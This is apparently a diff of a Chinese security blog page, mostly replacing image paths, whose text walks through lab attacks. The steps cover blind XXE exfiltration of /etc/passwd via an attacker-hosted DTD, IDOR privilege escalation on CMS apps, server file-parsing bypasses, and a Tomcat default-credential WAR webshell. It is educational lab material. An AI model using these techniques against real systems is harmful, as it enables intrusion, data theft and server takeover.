 <p>选中后发到解码器：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\310.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/310.png" alt></p>
 <h2 id="play-xxe（靶机二）"><a href="#play-xxe（靶机二）" class="headerlink" title="play_xxe（靶机二）"></a>play_xxe（靶机二）</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>利用迅雷下载</p>
 <p>无回显：<a target="_blank" rel="noopener" href="https://isos.pentesterlab.com/play_xxe.iso">https://isos.pentesterlab.com/play_xxe.iso</a> 具有一定的特殊性<br>在VMware选择新建虚拟机，选择典型模式即可</p>
-<p><img src="F:\blog\source\_posts\漏洞part\282.png" style="zoom:67%;" /></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/282.png" style="zoom:67%;"></p>
 <p>.iso要选择linux ubuntu才能正常打开：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\283.png" style="zoom:67%;" /></p>
-<p><img src="F:\blog\source\_posts\漏洞part\284.png" style="zoom:67%;" /></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/283.png" style="zoom:67%;"></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/284.png" style="zoom:67%;"></p>
 <h3 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h3><p>打开play_xxe，不知道会启动到什么程度，把ip扫出来即可（本次play_xxe也可直接查ip）</p>
-<p><img src="F:\blog\source\_posts\漏洞part\311.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\312.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\331.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/311.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/312.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/331.png" alt></p>
 <p>确定ip为132，且80端口也开启</p>
 <p>用windows尝试访问ip，发现该页面提示为XML：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\313.png" style="zoom:80%;" /></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/313.png" style="zoom:80%;"></p>
 <p>也发现了登录页面（一般利用的地方便是登录处【传输数据的地方】），点击后出现了登录框。</p>
 <h4 id="方法一-2"><a href="#方法一-2" class="headerlink" title="方法一"></a>方法一</h4><p>根据前面的XML提示，进行抓包：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\314.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\316.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/314.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/316.png" alt></p>
 <p>发现红框的方式都能被接受，加上提示，已经很明显了</p>
 <p>也可以发到Repeater，进一步测试（将Content-Type改为text/xml）后Send，看是否能够出结果：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\317.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/317.png" alt></p>
 <p>错误的请求，将Content-Type改为application/xml后Send：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\318.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/318.png" alt></p>
 <p>状态码为200，说明xml可以利用，这种有回显的先尝试读取文件：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\319.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/319.png" alt></p>
 <p>虽然已经被指定，但是其不会返回到页面显示，一般尝试把application改为text，发现仍没有：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\320.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/320.png" alt></p>
 <p>情况相同，确认类型为：没有回显</p>
-<p><img src="F:\blog\source\_posts\漏洞part\321.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/321.png" alt></p>
 <p>kali上写一个test.dtd文件（XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素），用于接收数据，即通过靶机发送请求，请求服务器的text.dtd文件。：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\322.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/322.png" alt></p>
 <p>故要开启网站80端口（启动的位置要在.dtd目录下，不然访问不到，即在哪里目录下写命令，打开的便是哪个页面），开启kali的http服务：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\323.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/323.png" alt></p>
 <p>接着在Windows上访问kali的ip（在那个地方开启服务，便访问哪里）【Windows便可以直接下载文件，这也是文件传输的一种方式】：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\324.png" style="zoom:67%;" /></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/324.png" style="zoom:67%;"></p>
 <p>这样就可以执行payload：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\325.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/325.png" alt></p>
 <p>回到kali查看：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\326.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/326.png" alt></p>
 <p>发现为etc/passwd的数据，实现成功</p>
 <p>为什么会报404：</p>
 <p>因为在text.dtd中访问的是xxe.php，但是kali没有xxe.php故会报404。主要是执行p1，故这个文件名可以随便写。</p>
 <h4 id="方法二-2"><a href="#方法二-2" class="headerlink" title="方法二"></a>方法二</h4><p>利用wireshark选网卡后进行抓包</p>
 <p>打开wireshark：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\327.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/327.png" alt></p>
 <p>选择网卡：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\328.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/328.png" alt></p>
 <p>再用Windows中BP发一个请求，用wireshark抓到了该条数据</p>
-<p><img src="F:\blog\source\_posts\漏洞part\329.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/329.png" alt></p>
 <p>双击进入查看：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\330.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/330.png" alt></p>
 <p>所有网站访问、网络请求等与流量访问有关联的行为，选择正确的网卡，wireshark都可以抓到。</p>
 <h2 id="xxe（靶场三）"><a href="#xxe（靶场三）" class="headerlink" title="xxe（靶场三）"></a>xxe（靶场三）</h2><p>利用xxe执行系统命令&amp;内网探测</p>
 <p>输入数据打开抓包，去抓一下</p>
@@ -680,48 +468,48 @@ MathJax = {
 <p>反序列化：将对象的状态信息转换为对象（可以存储或传输的形式）</p>
 <p>s:string</p>
 <p>o:object</p>
-<p><img src="F:\blog\source\_posts\漏洞part\304.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\305.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/304.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/305.png" alt></p>
 <h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p>越权漏洞的成因主要是开发⼈员在对数据进行增、删、改、查询时对客户端请求的数据过分相信，而遗漏了权限的判定。</p>
 <p>在实际的代码审计中，这种漏洞往往很难通过⼯具进行自动化监测，因此在实际应用中危害很大。其与未授权访问有⼀定差别。</p>
 <p>目前存在着两种越权操作类型，横向越权操作（水平越权）和纵向越权操作（垂直越权）。</p>
 <p>⼀般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方。如：改用户的id、用户名就可以获取或修改别⼈的信息。</p>
 <h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>当用户1对用户2的信息进行修改、删除、访问等操作，若两用户权限不同，即为垂直越权；若两用户权限相同，则为水平越权。</p>
 <h4 id="catfish垂直越权"><a href="#catfish垂直越权" class="headerlink" title="catfish垂直越权"></a>catfish垂直越权</h4><h5 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h5><p>将Catfishcms_v4.5.4放在WWW目录下，同样访问127.0.0.1/Catfishcms_v4.5.4会出现安装界面：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\342.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/342.png" alt></p>
 <p>安装完成，可以登录phpmyamin中查看是否数据库catfish创建成功</p>
-<p><img src="F:\blog\source\_posts\漏洞part\343.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/343.png" alt></p>
 <p>进入后台并登录【漏洞点在后台——用户管理——管理后台用户】</p>
 <h5 id="操作-2"><a href="#操作-2" class="headerlink" title="操作"></a>操作</h5><p>目标：通过用户user的权限修改admin管理员的页面</p>
 <p>首先添加一个后台用户：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\344.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/344.png" alt></p>
 <p>由此，便可在管理后台用户界面查看该用户的信息。</p>
 <p>在另外一个浏览器，登录刚刚添加的后台用户，再写一篇文章，便可以在所有文章模块中进行编辑（修改标题），先输入好未进行修改：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\345.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/345.png" alt></p>
 <p>回到amin界面，想获得其的特征值（id值），编辑一篇由admin写的文章，进行抓包：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\346.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/346.png" alt></p>
 <p>得到了postId值为4后【识别文章的标识符是postId，即通过其来识别】，正常放包。</p>
 <p>再到后台用户user端写文章【为显示方便只修改标题】，进行抓包，将postId改为admin端的值，再次放包，此时user端没有说明变化，回到admin端查看，发现原来admin的文章改变了。</p>
 <h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><h4 id="yxcms水平越权"><a href="#yxcms水平越权" class="headerlink" title="yxcms水平越权"></a>yxcms水平越权</h4><h5 id="安装-3"><a href="#安装-3" class="headerlink" title="安装"></a>安装</h5><p>首先将YXcms放在WWW文件夹下，在小皮中的软件管理中安装phpMyAdmin（网页管理数据库的工具）到WWW路径下：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\332.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\333.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/332.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/333.png" alt></p>
 <p>直接访问127.0.0.1/yxcms，会出现安装向导，跟着安装即可：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\337.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/337.png" alt></p>
 <p>安装完成后，先进入前台【漏洞点在前台】，注册一个账号t1：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\335.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\336.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/335.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/336.png" alt></p>
 <h5 id="操作-3"><a href="#操作-3" class="headerlink" title="操作"></a>操作</h5><p>目标：通过一个账户修改另一个账户的信息</p>
 <p>再开一个浏览器，注册另一个账号t2：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\338.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/338.png" alt></p>
 <p>利用修改密码界面，把t2的信息调出：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\339.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/339.png" alt></p>
 <p>回到t1账户，执行相同的操作，并随意写入电话号码，进行抓包，通过修改nickname（可获取）、id（可以采取爆破的方式），然后释放即关闭抓包：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\340.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/340.png" alt></p>
 <p>回到t2页面刷新，同样用修改密码的方式调出个人信息，发现值被修改：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\341.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/341.png" alt></p>
 <p>回顾：通过在t1处转包改包，将id值定位到t2，相当于可以把t2的信息进行修改。</p>
 <p>另，登录phpMyAdmin的账号密码同数据库：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\334.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/334.png" alt></p>
 <h1 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h1><p>如：IIS、Apache、Nginx</p>
 <p>有些漏洞不是出现在网页上的，而是因为我们使用了这些中间件，产生了漏洞，且不同版本解析的漏洞不一致。</p>
 <h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><h3 id="IIS6-0解析漏洞："><a href="#IIS6-0解析漏洞：" class="headerlink" title="IIS6.0解析漏洞："></a>IIS6.0解析漏洞：</h3><p>文件解析：上传⽂件，命名为：aa.asp;.jpg【会被解析为.asp文件、识别到;便以为文件读完；但上传时检测后缀，认为是.jps】</p>
@@ -729,37 +517,37 @@ MathJax = {
 <h3 id="IIS7-5解析漏洞："><a href="#IIS7-5解析漏洞：" class="headerlink" title="IIS7.5解析漏洞："></a>IIS7.5解析漏洞：</h3><p>上传文件：aaa.jpg，访问路径：UploadFiles/image/aaa.jpg/1.php【正常上传.jpg图片文件（含一句话木马等），但访问时加上即使不存在的1.php，会被当做php脚本】</p>
 <h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><h3 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h3><p>上传⽂件：a.php.xxx（用未限制的后缀xxx绕过黑名单）。apache解析原理：从右往左解析，解析不了，继续向前解析</p>
 <h3 id="操作-4"><a href="#操作-4" class="headerlink" title="操作"></a>操作</h3><p>启动phpStudy（PHP5.2.17），在WWW目录下上传phpinfo.php.qwe</p>
-<p><img src="F:\blog\source\_posts\漏洞part\347.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/347.png" alt></p>
 <p>但是访问时发现会被当为php解析</p>
-<p><img src="F:\blog\source\_posts\漏洞part\348.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/348.png" alt></p>
 <p>在没有漏洞处尝试，发现会报错，无法解析。</p>
 <h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>nginx解析漏洞：上传abc.png图⽚，访问路径：/abc.png/.php便会当作php执行</p>
+<p>nginx对应端口80</p>
 <h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><p>tomcat后台弱⼝令：登陆后台，上传war包</p>
 <h3 id="vulhub漏洞复现——Tomcat7-弱密码-amp-amp-后端Getshell漏洞"><a href="#vulhub漏洞复现——Tomcat7-弱密码-amp-amp-后端Getshell漏洞" class="headerlink" title="vulhub漏洞复现——Tomcat7+弱密码&amp;&amp;后端Getshell漏洞"></a>vulhub漏洞复现——Tomcat7+弱密码&amp;&amp;后端Getshell漏洞</h3><h4 id="环境启动"><a href="#环境启动" class="headerlink" title="环境启动"></a>环境启动</h4><p>使用docker搭建漏洞靶场环境</p>
-<p><img src="F:\blog\source\_posts\漏洞part\349.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/349.png" alt></p>
 <p>进入对应文件夹，打开终端，输入命令启动，再获取端口号（一般tomcat默认在8080端口）：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\350.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/350.png" alt></p>
 <p>在浏览器打开，正常访问tomcat页面：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\351.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/351.png" alt></p>
 <p>点击<code>Manager App</code>登录，默认用户名密码<code>tomcat:tomcat</code></p>
-<p><img src="F:\blog\source\_posts\漏洞part\352.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\353.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/352.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/353.png" alt></p>
 <h4 id="后台Getshell"><a href="#后台Getshell" class="headerlink" title="后台Getshell"></a>后台Getshell</h4><p>登录到后台后可以通过部署war包【war 包是 Sun 提出的一种 web 应用程序格式。它与 jar 类似，是很多文件的压缩包】进行getshell</p>
 <h5 id="准备jsp木马"><a href="#准备jsp木马" class="headerlink" title="准备jsp木马"></a>准备jsp木马</h5><p>利用.jsp一句话木马：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\354.png" style="zoom: 50%;" /></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/354.png" style="zoom: 50%;"></p>
 <h5 id="制作war包"><a href="#制作war包" class="headerlink" title="制作war包"></a>制作war包</h5><p>将其压缩，并将.zip后缀改为.war</p>
-<p><img src="F:\blog\source\_posts\漏洞part\355.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/355.png" alt></p>
 <h5 id="部署war包到Tomcat-Web应用程序管理者"><a href="#部署war包到Tomcat-Web应用程序管理者" class="headerlink" title="部署war包到Tomcat Web应用程序管理者"></a>部署war包到Tomcat Web应用程序管理者</h5><p>deploy后，应用列表已经出现上传的war包：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\356png.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/356png.png" alt></p>
 <p>访问1.jsp文件，如下图所示说明部署成功：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\357.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/357.png" alt></p>
 <p>打开蚁剑，添加数据，输入jsp木马中的密码cmd，注意要将连接类型改为jsp</p>
-<p><img src="F:\blog\source\_posts\漏洞part\358.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/358.png" alt></p>
 <p>链接成功，访问可查看本机的所有文件</p>
-<p><img src="F:\blog\source\_posts\漏洞part\359.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\360.png" alt=""></p>
-<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>nginx对应端口80</p>
-</script></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/359.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/360.png" alt></p>
+
       </div>
       
         <div class="prev-or-next">
@@ -796,7 +584,7 @@ MathJax = {
   <div class="post-catalog hidden" id="catalog">
     <div class="title">Contents</div>
     <div class="catalog-content">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%88XSS%EF%BC%89"><span class="toc-text">跨站脚本攻击（XSS）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B"><span class="toc-text">类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-text">反射型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA%E9%9D%B6%E5%9C%BA"><span class="toc-text">DVWA靶场</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-text">存储型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA%E9%9D%B6%E5%9C%BA-1"><span class="toc-text">DVWA靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BB%B6%E7%94%B3"><span class="toc-text">延申</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8B"><span class="toc-text">DOM型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pikachu%E9%9D%B6%E5%9C%BA"><span class="toc-text">pikachu靶场</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E7%B1%BB%E5%9E%8B%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">三种类型之间的区别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-labs-master%E9%9D%B6%E5%9C%BA"><span class="toc-text">xss-labs-master靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level1"><span class="toc-text">level1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text"> </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level2"><span class="toc-text">level2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E7%94%A8htmlspecialchars-%E5%87%BD%E6%95%B0%E5%AF%B9keyword%E5%8F%82%E6%95%B0%E7%9A%84%E5%80%BC%E8%BF%9B%E8%A1%8C%E5%A4%84%E7%90%86"><span class="toc-text">服务器端用htmlspecialchars()函数对keyword参数的值进行处理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text"> </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level3"><span class="toc-text">level3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level4"><span class="toc-text">level4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level5"><span class="toc-text">level5</span></a></li></ol></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF%E6%BC%8F%E6%B4%9E"><span class="toc-text">CSRF漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA%E9%9D%B6%E5%9C%BA"><span class="toc-text">DVWA靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E6%BC%8F%E6%B4%9E"><span class="toc-text">SSRF漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pikachu%E9%9D%B6%E5%9C%BA"><span class="toc-text">pikachu靶场</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#upload-labs"><span class="toc-text">upload-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-01"><span class="toc-text">Pass-01</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E7%A6%81%E7%94%A8js"><span class="toc-text">方法一 禁用js</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-%E6%8A%93%E5%8C%85"><span class="toc-text">方法二 抓包</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-02"><span class="toc-text">Pass-02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-03"><span class="toc-text">Pass-03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-04"><span class="toc-text">Pass-04</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%B6%E7%94%B3"><span class="toc-text">延申</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">命令执行&#x2F;代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-Airflow-CVE-2020-11978"><span class="toc-text">Apache Airflow(CVE-2020-11978)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8vulhub%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83"><span class="toc-text">启动vulhub靶场环境</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1"><span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#NC%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">NC反弹shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-text">修复建议</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA"><span class="toc-text">DVWA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E9%98%B6"><span class="toc-text">进阶</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#xxe%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">xxe外部实体注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8Fvulnhub-XXE%EF%BC%88%E9%9D%B6%E6%9C%BA%E4%B8%80%EF%BC%89"><span class="toc-text">渗透vulnhub-XXE（靶机一）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-text">安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C"><span class="toc-text">操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8nmap%E6%89%AB%E6%8F%8F%E8%8E%B7%E5%8F%96ip"><span class="toc-text">利用nmap扫描获取ip</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8nmap%E7%9C%8B%E6%98%AF%E5%90%A6%E5%AD%98%E6%B4%BB"><span class="toc-text">利用nmap看是否存活</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8nmap%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3"><span class="toc-text">利用nmap扫描端口</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8dirb%E6%89%AB%E6%8F%8F%E7%9B%AE%E5%BD%95"><span class="toc-text">利用dirb扫描目录</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="toc-text">漏洞探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" 